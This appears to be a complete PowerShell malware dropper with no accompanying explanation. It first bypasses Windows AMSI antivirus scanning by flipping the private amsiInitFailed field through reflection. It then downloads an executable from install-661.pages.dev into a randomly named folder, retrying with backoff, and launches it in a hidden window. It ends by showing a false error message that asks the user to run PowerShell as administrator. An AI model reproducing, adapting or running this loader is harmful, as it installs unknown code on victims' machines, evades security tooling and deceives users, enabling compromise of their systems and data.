param( [int]$Retries = 5, [int]$BaseDelay = 5 )
function Disable-Amsi {
    $asm = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GetName().Name -eq 'System.Management.Automation' } | Select-Object -First 1
    if ($asm) {
        $type = $asm.GetType('System.Management.Automation.AmsiUtils')
        $flags = [Reflection.BindingFlags]::NonPublic -bor [Reflection.BindingFlags]::Static
        $field = $type.GetField('amsiInitFailed',$flags)
        if ($field) {
            $field.SetValue($null,$true)
        }
    }
}
Disable-Amsi
function Download-Reliable {
    param($Url, $Out)
    for ($i = 1; $i -le $Retries; $i++) {
        try {
            $wc = New-Object Net.WebClient
            $wc.Headers['User-Agent'] = 'PowerShell'
            $wc.DownloadFile($Url, $Out)
            if (Test-Path $Out) {
                return $true
            }
        }
        catch {}
        Start-Sleep -Seconds ($BaseDelay * [Math]::Pow(2, $i-1) + (Get-Random -Max 5))
    }
    return $false
}
$r1 = [guid]::NewGuid().ToString('N')
$dir = Join-Path $env:LOCALAPPDATA $r1
$exe = Join-Path $dir "$r1.exe"
$u1 = 'https://install-661.pages.dev/003jam49ph.exe'
New-Item -Path $dir -ItemType Directory -Force | Out-Null
if (Download-Reliable $u1 $exe) {
    Start-Process -FilePath $exe -WindowStyle Hidden
}
else {
    exit 1
}
Remove-Item $dir -Recurse -Force -ErrorAction SilentlyContinue
Write-Host 'Initialization failed. Please run PowerShell as administrator.' -ForegroundColor Red